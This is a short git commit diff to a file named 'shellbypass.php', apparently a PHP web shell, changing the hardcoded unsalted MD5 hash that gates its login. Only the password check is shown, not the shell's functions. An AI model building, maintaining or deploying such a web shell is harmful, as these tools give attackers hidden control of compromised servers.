977ac58fd3b6ddda8dec06e99cb45b52b1443fcd
marketingharian <marketingharian@gmail.com>
2025-02-01 11:29:48 +0700

    Update shellbypass.php

--- shellbypass.php
+++ shellbypass.php
@@ -40,7 +40,7 @@ if (is_logged_in()) {
     // Display login form if not logged in
     if (isset($_POST['password'])) {
         $entered_password = $_POST['password'];
-        $hashed_password = 'VHVoYW55YW5ndGF1MTEyMiQk'; // Replace this with your MD5 hashed password
+        $hashed_password = '07b320362b3556d3a00fc7fc5ce064a1'; // Replace this with your MD5 hashed password
         if (md5($entered_password) === $hashed_password) {
             // Password is correct, set a cookie to indicate login
             setcookie('user_id', 'user123', time() + 3600, '/'); // Ganti 'user123' dengan nilai yang sesuai
